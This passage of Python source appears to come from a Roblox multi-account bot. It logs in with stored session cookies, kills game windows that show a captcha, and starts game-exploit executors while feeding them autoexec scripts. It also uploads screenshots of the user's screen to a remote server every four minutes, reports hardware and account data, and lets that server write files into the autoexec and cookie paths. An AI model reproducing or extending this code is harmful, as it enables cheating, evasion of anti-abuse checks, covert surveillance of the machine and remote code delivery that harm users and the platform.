            ecb_ok, ecb_err = _try_warmup_native_ecb()
            cry_ok, cry_err = _try_warmup_cryptography()
            _CBC_NATIVE_READY = cbc_ok
            _ECB_NATIVE_READY = ecb_ok
            _CRYPTOGRAPHY_READY = cry_ok
            if cbc_ok or ecb_ok or cry_ok:
                _CRYPTO_WARMED = True
                _CRYPTO_LAST_ERROR = ""
                return True
            _CRYPTO_LAST_ERROR = f"cbc={cbc_err or 'n/a'} | ecb={ecb_err or 'n/a'} | cryptography={cry_err or 'n/a'}"
            time.sleep(min(1.2, base_delay * (attempt + 1)))
        logging.error("Crypto warmup failed: %s", _CRYPTO_LAST_ERROR)
        return False


def _xor_bytes(left: bytes, right: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(left, right))


def _encrypt_cbc_via_ecb(key_bytes: bytes, iv_bytes: bytes, padded_plain: bytes) -> bytes:
    ecb = AES.new(key_bytes, AES.MODE_ECB)
    out = bytearray()
    prev = iv_bytes
    bs = AES.block_size
    for idx in range(0, len(padded_plain), bs):
        block = padded_plain[idx : idx + bs]
        enc_block = ecb.encrypt(_xor_bytes(block, prev))
        out.extend(enc_block)
        prev = enc_block
    return bytes(out)


def _decrypt_cbc_via_ecb(key_bytes: bytes, iv_bytes: bytes, ciphertext: bytes) -> bytes:
    ecb = AES.new(key_bytes, AES.MODE_ECB)
    out = bytearray()
    prev = iv_bytes
    bs = AES.block_size
    for idx in range(0, len(ciphertext), bs):
        enc_block = ciphertext[idx : idx + bs]
        dec_block = ecb.decrypt(enc_block)
        out.extend(_xor_bytes(dec_block, prev))
        prev = enc_block
    return bytes(out)


def _encrypt_cbc_via_cryptography(key_bytes: bytes, iv_bytes: bytes, padded_plain: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    encryptor = Cipher(algorithms.AES(key_bytes), modes.CBC(iv_bytes)).encryptor()
    return encryptor.update(padded_plain) + encryptor.finalize()


def _decrypt_cbc_via_cryptography(key_bytes: bytes, iv_bytes: bytes, ciphertext: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    decryptor = Cipher(algorithms.AES(key_bytes), modes.CBC(iv_bytes)).decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def _encrypt_cbc_auto(key_bytes: bytes, iv_bytes: bytes, padded_plain: bytes) -> bytes:
    _warmup_crypto_backend()
    if _CBC_NATIVE_READY:
        return AES.new(key_bytes, AES.MODE_CBC, iv_bytes).encrypt(padded_plain)
    if _ECB_NATIVE_READY:
        return _encrypt_cbc_via_ecb(key_bytes, iv_bytes, padded_plain)
    return _encrypt_cbc_via_cryptography(key_bytes, iv_bytes, padded_plain)


def _decrypt_cbc_auto(key_bytes: bytes, iv_bytes: bytes, ciphertext: bytes) -> bytes:
    _warmup_crypto_backend()
    if _CBC_NATIVE_READY:
        return AES.new(key_bytes, AES.MODE_CBC, iv_bytes).decrypt(ciphertext)
    if _ECB_NATIVE_READY:
        return _decrypt_cbc_via_ecb(key_bytes, iv_bytes, ciphertext)
    return _decrypt_cbc_via_cryptography(key_bytes, iv_bytes, ciphertext)


def encrypt_aes(plaintext: str) -> str:
    iv = os.urandom(16)
    padded_data = pad(plaintext.encode("utf-8"), AES.block_size)
    encrypted = _encrypt_cbc_auto(FIXED_KEY, iv, padded_data)
    return base64.b64encode(iv + encrypted).decode("utf-8")


def decrypt_aes(ciphertext_b64: str) -> str:
    raw_data = base64.b64decode(ciphertext_b64)
    iv, enc_data = raw_data[:16], raw_data[16:]
    padded_plain = _decrypt_cbc_auto(FIXED_KEY, iv, enc_data)
    return unpad(padded_plain, AES.block_size).decode("utf-8")


# ============================================================================
# Hardware Info, Screenshots, & Whitelist Authentication
# ============================================================================

def get_ram_usage_string():
    try:
        memory = psutil.virtual_memory()
        total_ram = round(memory.total / 1073741824)
        used_ram = round(memory.used / 1073741824)
        percent_used = round(memory.percent)
        return f"({percent_used}%)-{used_ram}/{total_ram}GB"
    except Exception:
        return "(0%)-0/0GB"


def get_windows_desktop_name():
    try:
        return os.getenv("COMPUTERNAME") or "NAH"
    except Exception:
        return "Unknown Desktop"


def capture_and_compress_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot = screenshot.resize((screenshot.width // 2, screenshot.height // 2))
        buffered = BytesIO()
        screenshot.save(buffered, format="JPEG", quality=100)
        compressed_image_data = buffered.getvalue()
        gzip_buffer = BytesIO()
        with gzip.GzipFile(fileobj=gzip_buffer, mode="wb") as gzip_file:
            gzip_file.write(compressed_image_data)
        return base64.b64encode(gzip_buffer.getvalue()).decode("utf-8")
    except Exception:
        return "Not Found"


def send_compressed_screenshot(server_ip, server_port, user_id, user_key, chunk_size=800, timeout=15):
    b64_data = capture_and_compress_screenshot()
    if b64_data == "Not Found":
        return
    chunks = [b64_data[i : i + chunk_size] for i in range(0, len(b64_data), chunk_size)]
    total_chunks = len(chunks)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        for idx, chunk in enumerate(chunks):
            pkt = {
                "user_id": user_id,
                "user_key": user_key,
                "chunk_index": idx,
                "total_chunks": total_chunks,
                "data": chunk,
            }
            sock.sendto(json.dumps(pkt).encode("utf-8"), (server_ip, server_port))
            time.sleep(0.001)


readthetotalcount = 0
stopped = False
nahnah = False


def generate_random_string(length=16):
    characters = string.ascii_letters + string.digits
    return "".join(secrets.choice(characters) for _ in range(length))


async def handle_upload_file(uuid_val, key, filename, upload_type):
    download_url = f"https://whitelist.testwebyummy.click/actions_uploads_file/{uuid_val}/{key}/{filename}"
    async with aiohttp.ClientSession() as session:
        async with session.get(download_url, timeout=15) as response:
            if response.status != 200:
                return
            content = await response.read()
    if upload_type == "cookie":
        file_path = "cookie.txt"
    elif upload_type == "autoexec":
        folder_path = _get_autoexec_folder(config)
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, filename)
    elif upload_type == "config":
        file_path = "config.json"
    else:
        os.makedirs("TempsFile", exist_ok=True)
        file_path = os.path.join("TempsFile", filename)
    with open(file_path, "wb") as f:
        f.write(content)
    if upload_type == "autoexec":
        killproc()


connectionfailtext = ""
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = True
ssl_context.verify_mode = ssl.CERT_REQUIRED


async def sendimagepost():
    while True:
        try:
            screenshot = ImageGrab.grab()
            screenshot = screenshot.resize((screenshot.width // 2, screenshot.height // 2))
            os.makedirs("log", exist_ok=True)
            file_path = os.path.join("log", "screenshot_pc.jpg")
            screenshot.save(file_path, "JPEG")
            with open(file_path, "rb") as f:
                requests.post(
                    "https://api.testwebyummy.click/upload-screenshot",
                    data={"user_id": auth.get("UserID (UUID)"), "user_key": auth.get("Key")},
                    files={"file": ("screenshot_pc.jpg", f, "image/jpeg")},
                )
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception:
            pass
        await asyncio.sleep(240)


def get_hardware_info():
    try:
        c = wmi.WMI()
        desktop = socket.gethostname()
        cpu = next((proc.Name for proc in c.Win32_Processor()), "Unknown")
        mainboard = next((board.Product for board in c.Win32_BaseBoard()), "Unknown")
        ssd = next(
            (drive.Model for drive in c.Win32_DiskDrive() if "SSD" in (drive.Model or "").upper()),
            next((drive.Model for drive in c.Win32_DiskDrive()), "Unknown"),
        )
        return desktop, cpu, mainboard, ssd
    except Exception:
        return "Unknow", "Unknow", "Unknow", "Unknow"


desktop_name, cpu_info, mainboard_info, ssd_info = get_hardware_info()
number_of_lines1 = 0


def update_readthetotalcount():
    global readthetotalcount, number_of_lines1
    unique_lines = set()
    if os.path.exists("switched/storeddata.txt"):
        with open("switched/storeddata.txt", "r", encoding="utf-8-sig", errors="ignore") as f:
            for line in f:
                parts = line.strip().split(" - ")
                if parts and parts[0]:
                    unique_lines.add(parts[0])
    readthetotalcount = 0
    if os.path.exists("cookie.txt"):
        with open("cookie.txt", "r", encoding="utf-8-sig", errors="ignore") as f1:
            lines1 = f1.read().splitlines()
            number_of_lines1 = len(lines1)
            for l in lines1:
                parts = l.strip().split(":")
                if parts and parts[0] not in unique_lines:
                    readthetotalcount += 1


mistmatch = [102, 97, 105, 108, 32, 45, 32, 117, 115, 101, 114, 107, 101, 121, 32, 109, 105, 115, 109, 97, 116, 99, 104]
user_idnotin = [102, 97, 105, 108, 32, 45, 32, 117, 115, 101, 114, 95, 105, 100, 32, 110, 111, 116, 32, 105, 110, 32, 119, 104, 105, 116, 101, 108, 105, 115, 116]
cantdecr = [102, 97, 105, 108, 32, 45, 32, 99, 97, 110, 110, 111, 116, 32, 100, 101, 99, 114, 121, 112, 116, 32, 115, 101, 115, 115, 105, 111, 110, 32, 112, 111, 115, 116]
sessionfound = [102, 97, 105, 108, 32, 45, 32, 102, 111, 117, 110, 100, 32, 116, 104, 105, 115, 32, 117, 115, 101, 114, 107, 101, 121, 32, 111, 110, 32, 111, 116, 104, 101, 114, 32, 112, 99]


def checkcode(valid):
    textvalid = "".join(chr(c) for c in valid)
    return textvalid if textvalid else "Success"


validate = False
sslverify = False
sessionnotfound = False
errorconnection = False
isalive = False

auth_url = "https://whitelist.testwebyummy.click/emu/auth"
update_url = "https://whitelist.testwebyummy.click/emu/update"
from requests.exceptions import Timeout

authsession2 = requests.Session()


def authenticates(uuid_enc: str):
    global sessionnotfound, connectionfailtext
    params = {
        "user_id": auth.get("UserID (UUID)"),
        "userkey": auth.get("Key"),
        "uuid": uuid_enc,
        "desktop_name": urllib.parse.quote(desktop_name),
        "cpu": urllib.parse.quote(cpu_info),
        "mainboard": urllib.parse.quote(mainboard_info),
        "ssd_name": urllib.parse.quote(ssd_info),
    }
    try:
        resp = authsession2.post(auth_url, params=params, timeout=60)
        if resp.status_code == 200:
            return resp.json().get("token")
        data = resp.json()
        detail = data.get("detail", "<no detail>")
        if detail == "fail - found this userkey on other pc":
            sessionnotfound = True
            connectionfailtext = detail
        elif detail in ("fail - userkey mismatch", "fail - user_id not in whitelist"):
            sessionnotfound = True
            connectionfailtext = detail
    except Exception as e:
        connectionfailtext = str(e)
    return None


def checkingwhitelist():
    global validate, sessionnotfound, missmatchverify, isalive, connectionfailtext
    while True:
        try:
            uuidd = generate_random_string(16)
            uuid_enc = encrypt_aes(uuidd)
            token = authenticates(uuid_enc)
            if not token:
                time.sleep(20)
                continue
            decrypted = decrypt_aes(token)
            ts_str, _ = decrypted.split("+", 1)
            ts = datetime.fromisoformat(ts_str)
            if current_utc_time and abs((current_utc_time - ts).total_seconds()) > timedelta(days=2).total_seconds():
                sessionnotfound = True
                connectionfailtext = "Expired Token"
                time.sleep(10)
                continue
            sessionnotfound = False
            validate = True
            missmatchverify = False
            isalive = True
            headers = {"Authorization": token}
            pc_name = get_windows_desktop_name()
            ram_usage = get_ram_usage_string()
            update_readthetotalcount()
            payload = {
                "user_id": auth.get("UserID (UUID)"),
                "screenshot": "Not Found",
                "total_changed": count_lines_in_file("switched/storeddata.txt"),
                "total_cookie": count_lines_in_file("cookie.txt"),
                "user_key": auth.get("Key"),
                "discord_id": discordid,
                "note": auth.get("Note"),
                "emulators": werbrbs,
                "total_online": totalonline,
                "total_offline": totaloffline,
                "total_deadcookie": totaldeadcookie,
                "pc_name": pc_name,
                "ram_usage": ram_usage,
                "is_emulator": False,
                "notfound_acc": f"{readthetotalcount}/{number_of_lines1}",
                "autoexec": autoexeclist,
            }
            authsession2.post(update_url, json=payload, headers=headers, timeout=60)
            time.sleep(20)
        except Exception as e:
            connectionfailtext = str(e)
            time.sleep(20)


# ============================================================================
# Roblox Launcher (`startroblox` & `launch_roblox`)
# ============================================================================

def startroblox():
    def extract_private_server_code(link):
        parsed_url = urlparse(str(link or ""))
        query_params = parse_qs(parsed_url.query)
        if "code" in query_params:
            return query_params["code"][0], True
        if "privateServerLinkCode" in query_params:
            return query_params["privateServerLinkCode"][0], False
        return None, False

    def fetch_svvlink(feck, cookie, max_attempts=3):
        url = "https://apis.roblox.com/sharelinks/v1/resolve-link"
        for attempt in range(max_attempts):
            try:
                response3 = requests.post(
                    "https://auth.roblox.com/v1/authentication-ticket/",
                    cookies={".ROBLOSECURITY": cookie.strip()},
                    timeout=15,
                )
                csrf_token = response3.headers.get("X-CSRF-TOKEN")
                if not csrf_token:
                    continue
                headers = {
                    "Content-Type": "application/json;charset=UTF-8",
                    "X-Csrf-Token": csrf_token,
                    "Accept": "application/json, text/plain, */*",
                    "Cookie": f".ROBLOSECURITY={cookie.strip()}",
                    "Origin": "https://www.roblox.com",
                    "Referer": "https://www.roblox.com/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                }
                data = {"linkId": feck, "linkType": "Server"}
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=5)
                if response.status_code == 200:
                    return response.json().get("privateServerInviteData", {}).get("linkCode")
            except Exception:
                pass
        return None

    def select_server(servers):
        eligible = [s for s in servers if s.get("id") not in predefined_setss and s.get("playing", 0) >= 2]
        low_player = [s for s in eligible if s.get("playing", 0) <= 8]
        pool = sorted(low_player or eligible, key=lambda x: x.get("playing", 0))
        return pool[0]["id"] if pool else None

    def fetch_servers(PLACE_ID, FOUND_ANYTHING=""):
        url = f"https://games.roblox.com/v1/games/{PLACE_ID}/servers/Public?sortOrder=Asc&limit=100"
        if FOUND_ANYTHING:
            url += f"&cursor={FOUND_ANYTHING}"
        try:
            response = requests.get(url, timeout=20)
            data = response.json()
            return data.get("data", []), data.get("nextPageCursor", "")
        except requests.RequestException:
            return False, ""

    def fetch_and_choose_server(PLACE_ID):
        cursor = ""
        while True:
            servers, cursor = fetch_servers(PLACE_ID, cursor)
            if not servers:
                return None
            chosen = select_server(servers)
            if chosen:
                predefined_setss.add(chosen)
                return chosen
            if not cursor:
                return None

    def delete_cookie_from_file(cookie_file, token):
        if not os.path.exists(cookie_file):
            return
        with open(cookie_file, "r", encoding="utf-8-sig", errors="ignore") as rf:
            lines = rf.readlines()
        new_lines = [l for l in lines if l.strip() != str(token).strip()]
        with open(cookie_file, "w", encoding="utf-8-sig") as wf:
            wf.writelines(new_lines)

    def launch_roblox(session, valid_cookie):
        name = valid_cookie.get("name")
        cookie = valid_cookie.get("cookie")
        pid_target = config.get("PlaceId")
        time.sleep(2)
        check_and_kill_roblox_process()

        if config.get("Change Account Bloxfruit"):
            bf_data = check_and_print_cookie_data(config.get("Exploit WorkSpace Folder", ""), name)
            if bf_data and check_conditions("stored/bloxfruit.json", bf_data, valid_cookie.get("defaultck"), name):
                purple(f"Condition Met: Changing acc {name}")
                openstoreddata(name)
                if config.get("Delete the account after changing the account"):
                    delete_cookie_from_file("cookie.txt", valid_cookie.get("defaultck"))
                trackrobloxnameandkill(name)
                check_cookie(thread_count=20)
                return

        if config.get("Change Account Pet99"):
            p99_data = check_and_print_cookie_dataforpet99(config.get("Exploit WorkSpace Folder", ""), name)
            if p99_data and check_int_conditions("stored/pet99.json", p99_data, valid_cookie.get("defaultck")):
                purple(f"Condition Met: Changing acc {name}")
                openstoreddata(name)
                if config.get("Delete the account after changing the account"):
                    delete_cookie_from_file("cookie.txt", valid_cookie.get("defaultck"))
                trackrobloxnameandkill(name)
                check_cookie(thread_count=20)
                return

        if validateisonline(name):
            success(f"{name} - ONLINE ")
            post_minimal_user(pid_target, auth.get("UserID (UUID)"), name, discordid, auth.get("Note"))
            return

        error(f"{name} - OFFLINE ")
        if config.get("Check Banned Account and Change"):
            if check_banned_in_process(cookie, pid_target, name):
                purple(f"Banned Cookie Detected: {name}")
                bannedacc.add(name)
                openstoreddata(name)
                savedebancookie(valid_cookie.get("defaultck"))
                trackrobloxnameandkill(name)
                check_cookie(thread_count=30)
                return

        headers = {
            "Content-Type": "application/json",
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Roblox/WinInetRobloxApp/0.695.0.6950957 (GlobalDist; RobloxDirectDownload)",
        }
        resp_csrf = session.post("https://auth.roblox.com/v1/authentication-ticket/", headers=headers, timeout=8)
        csrf_token = resp_csrf.headers.get("x-csrf-token")
        if not csrf_token:
            error(f"Failed to fetch X-CSRF-TOKEN for Name: {name}")
            return

        uid_str = str(valid_cookie.get("id"))
        if uid_str not in user_data_map:
            user_data_map[uid_str] = random.randint(100000000000, 999999999999)
            save_user_data()
        browser_tracker_id = user_data_map[uid_str]

        ticket_headers = {
            "X-Csrf-Token": csrf_token,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/games/4924922222/Brookhaven-RP",
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Roblox/WinInetRobloxApp/0.695.0.6950957 (GlobalDist; RobloxDirectDownload)",
        }
        resp_ticket = session.post("https://auth.roblox.com/v1/authentication-ticket/", headers=ticket_headers, timeout=8)
        auth_ticket = resp_ticket.headers.get("rbx-authentication-ticket")
        if not auth_ticket:
            error(f"Failed to retrieve authentication ticket for Name: {name}")
            return

        launch_time = int(time.time() * 1000)
        launcher_url = (
            f"roblox-player:1+launchmode:play+gameinfo:{auth_ticket}"
            f"+launchtime:{launch_time}"
            f"+placelauncherurl:https%3A%2F%2Fwww.roblox.com%2FGame%2FPlaceLauncher.ashx"
            f"%3Frequest%3DRequestGame%26browserTrackerId%3D{browser_tracker_id}"
            f"%26placeId%3D{pid_target}%26isPlayTogetherGame%3Dfalse"
            f"+browsertrackerid:{browser_tracker_id}+robloxLocale:vi_vn+gameLocale:vi_vn+channel:+LaunchExp:InApp"
        )
        baseline_pids = get_roblox_processes() if config.get("Suspend Roblox After Launch") else set()
        ctypes.windll.shell32.ShellExecuteW(None, "open", launcher_url, None, None, 1)
        if config.get("Suspend Roblox After Launch"):
            _pause_roblox_launch(name, baseline_pids)
        valid_cookie_tracker[name] = datetime.now(timezone.utc).replace(tzinfo=None).strftime("%Y-%m-%d %H:%M:%S")
        success("Launched Roblox")
        processed_names.add(name)

    session = requests.Session()
    for index, valid_cookie in enumerate(list(valid_cookies)):
        info(f"[{index + 1}] Checking: {valid_cookie.get('name')}")
        launch_roblox(session, valid_cookie)
        delay_open = config.get("DelayOpen", 60)
        info(f"Delaying for {delay_open} seconds... ")
        time.sleep(delay_open)


# ============================================================================
# Memory Verification Scanners & Window Arrangement
# ============================================================================

def scan_verification(proc_name="robloxplayerbeta.exe", pid=None):
    msg = b"Challenge is required to authorize the request"
    needles = [msg, msg.decode("utf-8").encode("utf-16le")]
    return _scan_process_memory_for_needles(proc_name, pid, needles)


def _load_seli_error_messages(file_path="stored/seli_error_message"):
    defaults = ["No such host", "Challenge is required to authorize the request"]
    if not os.path.exists(file_path):
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("\n".join(defaults) + "\n")
        return defaults
    with open(file_path, "r", encoding="utf-8-sig", errors="ignore") as f:
        lines = [l.strip() for l in f if l.strip()]
    return lines or defaults


def scan_seli_errormess(proc_name="app.exe", pid=None, return_flags=False):
    msgs = _load_seli_error_messages()
    needles = []
    for m in msgs:
        needles.append(m.encode("utf-8"))
        needles.append(m.encode("utf-16le"))
    return _scan_process_memory_for_needles(proc_name, pid, needles)


def kill_seliware_errormess(interval=None, target_name="app.exe"):
    while True:
        for p in psutil.process_iter(attrs=["pid", "name"]):
            try:
                if (p.info.get("name") or "").lower() == target_name.lower():
                    if scan_seli_errormess(pid=p.info["pid"]):
                        warn(f"Found Seliware Error Message Killed Process With PID {p.info['pid']}")
                        p.kill()
            except Exception:
                pass
        time.sleep(interval or 60)


def kill_captcha(interval=120, target_name="robloxplayerbeta.exe"):
    while True:
        for p in psutil.process_iter(attrs=["pid", "name"]):
            try:
                if (p.info.get("name") or "").lower() == target_name.lower():
                    if scan_verification(pid=p.info["pid"]):
                        warn(f"Found Captcha Killed Process With PID {p.info['pid']}")
                        p.kill()
            except Exception:
                pass
        time.sleep(config.get("Close Roblox (Captcha) Delay", interval))


_CAPTCHA_USERS_LOCK = threading.Lock()
_CAPTCHA_USERS = set()
_CAPTCHA_SCAN_THREAD = None


def _build_tracker_to_username():
    tracker_map = {}
    for uid, name in browser_to_user_map.items():
        tracker = user_data_map.get(str(uid))
        if tracker:
            tracker_map[str(tracker)] = name
    return tracker_map


def _find_cookie_by_username(username):
    for vc in valid_cookies:
        if vc.get("name") == username:
            return vc.get("cookie")
    return None


def _match_username_for_pid(pid, tracker_map, cmdline_map):
    cmdline = cmdline_map.get(pid, "")
    for tracker, name in tracker_map.items():
        if tracker in cmdline:
            return name
    return None


def _captcha_scan_loop():
    while True:
        try:
            tracker_map = _build_tracker_to_username()
            for pid, cmdline in _get_roblox_process_cmdlines(force=True):
                matched_name = None
                for tracker, name in tracker_map.items():
                    if tracker in cmdline:
                        matched_name = name
                        break
                if matched_name and scan_verification(pid=pid):
                    with _CAPTCHA_USERS_LOCK:
                        _CAPTCHA_USERS.add(matched_name)
        except Exception:
            pass
        time.sleep(30)


def _start_captcha_scan_thread():
    global _CAPTCHA_SCAN_THREAD
    if _CAPTCHA_SCAN_THREAD and _CAPTCHA_SCAN_THREAD.is_alive():
        return
    _CAPTCHA_SCAN_THREAD = threading.Thread(target=_captcha_scan_loop, daemon=True)
    _CAPTCHA_SCAN_THREAD.start()


def is_captcha(pid):
    return scan_verification(pid=pid)


def move_and_resize_window(win, x, y, width, height):
    hwnd = win._hWnd
    ctypes.windll.user32.ShowWindow(hwnd, 9)
    ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, width, height, 0x0420)


_ARRANGE_ROBLOX_WINDOWS_LOCK = threading.Lock()


def _restore_and_foreground_window(win):
    hwnd = win._hWnd
    ctypes.windll.user32.ShowWindow(hwnd, 9)
    ctypes.windll.user32.ShowWindow(hwnd, 5)
    ctypes.windll.user32.BringWindowToTop(hwnd)
    ctypes.windll.user32.SetForegroundWindow(hwnd)


def _get_primary_work_area():
    rect = wintypes.RECT()
    if ctypes.windll.user32.SystemParametersInfoW(48, 0, byref(rect), 0):
        return rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top
    user32 = ctypes.windll.user32
    return 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)


def arrange_roblox_windows_once(force_foreground=False):
    try:
        windows = [
            w for w in gw.getAllWindows() if w.title == "Roblox" or any(u in w.title for u in setusername)
        ]
        windows.sort(key=lambda w: w.title)
        fixed_size = str(config.get("Fixed Size", "150x150")).lower().split("x")
        fixed_width = int(fixed_size[0]) if len(fixed_size) == 2 and fixed_size[0].isdigit() else 200
        fixed_height = int(fixed_size[1]) if len(fixed_size) == 2 and fixed_size[1].isdigit() else 200
        windows_per_row = max(1, int(config.get("Windows Per Rows", 10) or 10))
        for i, win in enumerate(windows):
            row = i // windows_per_row
            col = i % windows_per_row
            x = col * fixed_width
            y = row * (fixed_height + 30)
            if force_foreground:
                _restore_and_foreground_window(win)
            move_and_resize_window(win, x, y, fixed_width, fixed_height)
    except Exception as e:
        error(str(e))


def arrange_roblox_windows():
    while True:
        arrange_roblox_windows_once(force_foreground=False)
        time.sleep(60)


def arrange_roblox_windows_hotkey_once():
    if not _ARRANGE_ROBLOX_WINDOWS_LOCK.acquire(blocking=False):
        return
    try:
        arrange_roblox_windows_once(force_foreground=True)
    finally:
        _ARRANGE_ROBLOX_WINDOWS_LOCK.release()


def _deobf(obf_str: str, key: int = 85) -> str:
    parts = [p for p in str(obf_str).split(":") if p]
    out = [f"{int(p, 16) ^ key:02X}" for p in parts]
    return ":".join(out)


def healthz():
    url = "https://auth.testwebyummy.click/healthz"
    for _ in range(3):
        try:
            r = requests.get(url, timeout=15)
            fp = r.headers.get("X-FP") or r.headers.get("x-fp")
            if fp:
                return _deobf(fp, 85)
        except Exception:
            time.sleep(5)
    return None


def get_cert_fingerprint(cert_der: bytes, hash_alg: str = "sha256") -> str:
    h = hashlib.new(hash_alg)
    h.update(cert_der)
    digest = h.hexdigest().upper()
    return ":".join(digest[i : i + 2] for i in range(0, len(digest), 2))


def verify_certificate_with_pem(hostname, port, HEALTHZ, pem_path):
    global sslverify
    try:
        context = ssl.create_default_context(cafile=pem_path)
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED
        with socket.create_connection((hostname, port), timeout=6) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                server_cert_der = ssock.getpeercert(binary_form=True)
        server_fp = get_cert_fingerprint(server_cert_der, "sha256")
        if HEALTHZ and server_fp == HEALTHZ:
            sslverify = True
            return True
    except Exception:
        pass
    error("Fail To Verify SSL!")
    return False


certificate_content = yummypack.certificate()
with open("log/yummeo.pem", "w", encoding="utf-8") as log_file:
    log_file.write(certificate_content)


def killproc():
    for proc in psutil.process_iter(attrs=["pid", "name"]):
        try:
            if (proc.info.get("name") or "") == "RobloxPlayerBeta.exe":
                proc.kill()
        except Exception:
            pass


SW_MINIMIZE = 6
window_last_active = defaultdict(lambda: time.time())


def foreach_window(hwnd, lParam):
    length = GetWindowTextLength(hwnd)
    if length > 0:
        buff = ctypes.create_unicode_buffer(length + 1)
        GetWindowText(hwnd, buff, length + 1)
        title = buff.value
        if title == "Roblox" or any(u in title for u in setusername):
            current_time = time.time()
            if hwnd == ctypes.windll.user32.GetForegroundWindow():
                window_last_active[hwnd] = current_time
            elif (current_time - window_last_active[hwnd]) >= config.get("Delay Minimize", 5):
                ctypes.windll.user32.ShowWindowAsync(hwnd, 11)
    return True


def minimize_all_roblox_windows():
    cb_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    cb = cb_type(foreach_window)
    while True:
        try:
            EnumWindows(cb, 0)
            time.sleep(2)
        except Exception as e:
            error(f"Unexpected error: {e}")


def _detect_exploit_target():
    base = str(config.get("Exploit WorkSpace Folder", "")).strip()
    base_l = base.lower()
    localapp = os.getenv("LOCALAPPDATA") or ""
    if "seliware" in base_l:
        return {"process": "app.exe", "exe": os.path.join(localapp, "Seliware", "app.exe")}
    if "volt" in base_l:
        return {"process": "tauri-app.exe", "exe": os.path.join(localapp, "Volt", "tauri-app.exe")}
    return None


def start_exploit_exe():
    t = _detect_exploit_target()
    if not t:
        return
    exe = t["exe"]
    if os.path.exists(exe):
        subprocess.Popen([exe], cwd=str(Path(exe).parent))
        success(f"{exe} has been started.")


def startawp():
    while True:
        t = _detect_exploit_target()
        if t and not is_process_running(t["process"]):
            start_exploit_exe()
        time.sleep(300)


def pushchange(source_file):
    localapp = os.getenv("LOCALAPPDATA") or ""
    custom_dir = str(config.get("Custom Exploit Folder", "")).strip()
    workspace = str(config.get("Exploit WorkSpace Folder", "")).strip().lower()
    targets = []
    if custom_dir and custom_dir != "C:\\Users\\PC\\AppData\\Local\\ui":
        targets.append(os.path.join(custom_dir, "autoexec"))
    if "wave" in workspace:
        targets.append(os.path.join(localapp, "Wave", "Autoexecute"))
    elif "seliware" in workspace:
        targets.append(os.path.join(localapp, "seliware-autoexec"))
    else:
        targets.append(os.path.join(localapp, "ui", "autoexec"))
    for dst in set(targets):
        try:
            os.makedirs(dst, exist_ok=True)
            shutil.copy2(source_file, os.path.join(dst, os.path.basename(source_file)))
        except Exception:
            pass


def chunk_list(lst, chunk_size):
    return [lst[i : i + chunk_size] for i in range(0, len(lst), chunk_size)]


def get_cpu_model_windows():
    try:
        output = subprocess.check_output("wmic cpu get name", shell=True, timeout=5).decode()
        lines = [l.strip() for l in output.split("\n") if l.strip()]
        return lines[1] if len(lines) > 1 else "Unknown"
    except Exception:
        return "Unknown"


def get_ram_usage():
    return psutil.virtual_memory().percent


def run_async_in_thread(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(coro)


def clean_folder():
    if not os.path.isdir("switched"):
        return
    for fname in os.listdir("switched"):
        if fname not in ("storeddata.txt", "not_in_changeacc.txt"):
            try:
                os.remove(os.path.join("switched", fname))
            except Exception:
                pass


def send_webhook():
    pc_name = socket.gethostname()
    cpu_model = get_cpu_model_windows()
    phys = psutil.cpu_count(logical=False)
    logical = psutil.cpu_count(logical=True)
    total_ram = f"{psutil.virtual_memory().total / 1073741824:.2f} GB"
    plat = platform.platform()
    while True:
        webhook_url = str(config.get("Webhook Url", "")).strip()
        if not webhook_url:
            time.sleep(config.get("Webhook Delay Send [M]", 20) * 60)
            continue
        try:
            with mss.mss() as sct:
                sct.shot(mon=-1, output="log/image.png")
            embed = {
                "title": "Information",
                "description": (
                    f"**PC Name**: `{pc_name}`\n"
                    f"**CPU**: `{cpu_model}`\n"
                    f"**CPU Cores/Threads**: `{phys} cores/{logical} threads`\n"
                    f"**Total RAM**: `{total_ram}`\n"
                    f"**Platform**: `{plat}`"
                ),
                "author": {"name": "PC STATUS", "icon_url": "https://imgur.com/nwziB3v"},
                "image": {"url": "attachment://image.png"},
                "footer": {"text": "| https://discord.gg/yummyauto | "},
                "color": 65280,
                "fields": [
                    {"name": "**RAM :film_frames:**", "value": f"```{get_ram_usage()}%```", "inline": True},
                    {"name": "**ROBLOX ACTIVE** :video_game:", "value": f"```{get_process_count()}```", "inline": True},
                ],
            }
            with open("log/image.png", "rb") as img_f:
                requests.post(
                    webhook_url,
                    files={
                        "file": ("image.png", img_f, "image/png"),
                        "payload_json": (None, json.dumps({"embeds": [embed]})),
                    },
                )
            if os.path.exists("log/image.png"):
                os.remove("log/image.png")
        except Exception:
            pass
        time.sleep(config.get("Webhook Delay Send [M]", 20) * 60)


# ============================================================================
# WebSocket Dashboard Listener & NaCl / Ed25519 / PoW Key Verification
# ============================================================================

URL = f"wss://yummytrackstat.com/ws/tool/auto/{auth.get('UserID (UUID)', '')}"
USER_KEY = auth.get("Key", "")
RESULT_USER_ID = auth.get("UserID (UUID)", "")


